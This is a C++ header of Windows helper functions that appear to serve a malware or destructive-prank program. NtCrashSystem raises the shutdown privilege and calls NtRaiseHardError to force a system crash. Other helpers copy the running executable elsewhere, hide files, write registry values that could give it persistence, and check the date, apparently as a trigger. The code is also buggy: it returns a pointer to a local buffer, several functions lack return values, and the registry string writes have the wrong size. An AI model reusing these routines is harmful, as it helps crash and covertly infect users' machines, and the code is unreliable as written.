// FUNCTION HEADER //
#pragma once


#define DATE_DAY 0
#define DATE_MONTH 1
#define DATE_YEAR 2
#define RTL_SHUTDOWN_PRIVILEGE 19
#define NRHE_SHUTDOWN_RESPONSE_OPTION 6

typedef HANDLE HEAP;
typedef DWORD RTLPRIVILEGE, *LPRTLPRIVILEGE;
typedef DWORD HARD_ERROR_RESPONSE_OPTION;

INT WINAPI EndThread(HEAP heap, HANDLE handle) {
//	TerminateThread(handle, 0);
	CloseHandle(handle);
	HeapDestroy(heap);
}

INT WINAPI Refresh(VOID) {
	RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ALLCHILDREN | RDW_ERASE);
}

extern "C" {
	NTSTATUS WINAPI NtRaiseHardError(DWORD ntErrorCode, DWORD dwParamNum, DWORD dwOemStrParamMask, DWORD **ppdwParam, HARD_ERROR_RESPONSE_OPTION dwHardErrRspOption, DWORD *pdwRsp);
	NTSTATUS WINAPI RtlAdjustPrivilege(RTLPRIVILEGE rtlPrivilege, BYTE bEnable, BYTE bClient, BYTE *pbWasEnabled);
}

LPCWSTR getCurrentDir(VOID) {
	WCHAR dir[MAX_PATH];
	GetModuleFileNameW(NULL, (WCHAR *)dir, MAX_PATH);
	return (CONST WCHAR*)dir;
}

namespace System {
	INT DateCheck(INT date) {
		SYSTEMTIME lpSystemTime;
		GetSystemTime(&lpSystemTime);
		switch (date) {
			case DATE_YEAR: {
				return lpSystemTime.wYear;
				break;
			}
			case DATE_MONTH: {
				return lpSystemTime.wMonth;
				break;
			}
			case DATE_DAY: {
				return lpSystemTime.wDay;
				break;
			}
		}
	}
	
	INT WINAPI ExtCopyFile(LPCWSTR pwszOriginalFile, LPCWSTR pwszNewFile, BOOL FailIfExists, DWORD dwFileAttributes) {
		CopyFileW(pwszOriginalFile, pwszNewFile, FailIfExists);
		SetFileAttributesW(pwszNewFile, dwFileAttributes);
	}
	
	INT WINAPI HideFileW(LPCWSTR pwszFile) {
		SetFileAttributesW(pwszFile, FILE_ATTRIBUTE_HIDDEN);
	}
	
	DWORD64 WINAPI NtCrashSystem(NTSTATUS ntStatusCode, HARD_ERROR_RESPONSE_OPTION dwRspOption, BOOL isCustom, LPCTSTR lptszString) {
		BYTE UNUSED;
		RtlAdjustPrivilege(RTL_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &UNUSED);
		DWORD dwRsp;
		switch (isCustom) {
			case false: {
				NtRaiseHardError(ntStatusCode, 0, 0, NULL, NRHE_SHUTDOWN_RESPONSE_OPTION, &dwRsp);
				break;
			}
			case true: {
				NtRaiseHardError(ntStatusCode, 0, 0, (DWORD**)lptszString, NRHE_SHUTDOWN_RESPONSE_OPTION, &dwRsp);
				break;
			}
		}
	}
	
	FLONG WINAPI ManageRegW(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, BYTE lpData, LPBYTE lpData2, bool isSet, bool isString) {
	    HKEY hkResult;
	    if (isSet == false) {
	        if (isString == false) {
	            RegCreateKeyW(hKey, lpSubKey, &hkResult);
	            RegSetValueExW(hkResult, lpValueName, 0, dwType, &lpData, sizeof(lpData));
	        }
	        else if (isString == true) {
	            RegCreateKeyW(hKey, lpSubKey, &hkResult);
	            RegSetValueExW(hkResult, lpValueName, 0, REG_SZ, lpData2, sizeof(lpData2) * 16);
	        }
	    }
	    else if (isSet == true) {
	        if (isString == false) {
	            RegOpenKeyW(hKey, lpSubKey, &hkResult);
	            RegSetValueExW(hkResult, lpValueName, 0, dwType, &lpData, sizeof(lpData));
	        }
	        else if (isString == true) {
	            RegOpenKeyW(hKey, lpSubKey, &hkResult);
	            RegSetValueExW(hkResult, lpValueName, 0, REG_SZ, lpData2, sizeof(lpData2) * 16);
	        }
	    }
	}
	
	INT IfWindowsXP(VOID) {
		OSVERSIONINFOW versionInformation;
		memset(&versionInformation, 0, sizeof(versionInformation));
		versionInformation.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);
		GetVersionExW(&versionInformation);
		if (versionInformation.dwMajorVersion == 5) return TRUE;
		return FALSE;
	}
}
